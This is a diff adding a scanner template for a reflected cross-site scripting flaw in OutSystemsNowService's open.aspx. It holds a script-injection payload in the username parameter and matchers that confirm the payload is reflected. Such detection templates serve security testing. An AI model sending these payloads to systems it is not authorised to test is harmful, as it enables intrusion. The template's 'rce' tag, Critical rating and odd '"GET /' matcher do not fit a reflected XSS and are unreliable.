@@ -1,0 +1,27 @@
+id: OutSystemsNowService-Reflect-XSS
+info:
+  name: OutSystemsNowService RXSS
+  author: jkana101
+  severity: Critical
+  tags: rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/OutSystemsNowService/open.aspx?username=xxxxxx%27-alert(document.domain)-%27&password=&url= "
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"GET /'
+
+      - type: word
+        words:
+          - "'-alert(document.domain)-'"
+          - "OSNow"
+        part: body
+
+      - type: status
+        status:
+          - 200
